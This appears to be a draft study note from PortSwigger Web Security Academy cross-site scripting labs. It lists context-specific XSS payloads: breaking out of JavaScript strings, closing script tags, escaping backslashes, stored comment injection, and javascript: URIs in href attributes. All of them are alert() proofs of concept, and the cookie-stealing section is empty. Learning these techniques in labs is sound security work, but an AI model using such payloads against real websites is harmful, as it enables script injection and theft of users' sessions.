---
title: XSS (Cross Site Scripting)
draft: true
tags:
  - PortSwigger
  - WebSecurity
---
# What is XSS
XSS attack is type of injection , in which malicious scripts are injected 

# JavaScript string, angle brackets HTML-encoded.
- <script>alert(50)</script> => html encode 
- ';alert(50);// 
- ';alert(50);var s ='
# JavaScript string, single-quote backslash-escaped.
- <script>alert(50)</script> => html encode only in body tag
- in script tag read the script close tag and didn't encode it 
- so we can write a script tag in script tag and alert on it this is the payload : `'</script><script>alert(50)//`  this work 
# JavaScript string, angle brackets double-quotes encoded, single-quotes escaped. 
- <script>alert(50)</script> => html encode 
- `';alert(50);// ` add one \ => `\';alert(50);// ` and read it as string 
- i will try to escape a escape character using a `\`
- `\';alert(50);//` done 
# Stored XSS: HTML context nothing encoded.  
- try in all `<script>alert(50)</script>` input 
- the comment didn't encode so it work on it 
# HREF attribute double-quotes HTML-encoded.  
- try in all `<script>alert(50)</script>` input 
- nothing is done but i can write a js code in a tag using :` javascript:alert(50)` this will work
# Stealing cookies (exploiting).  
- 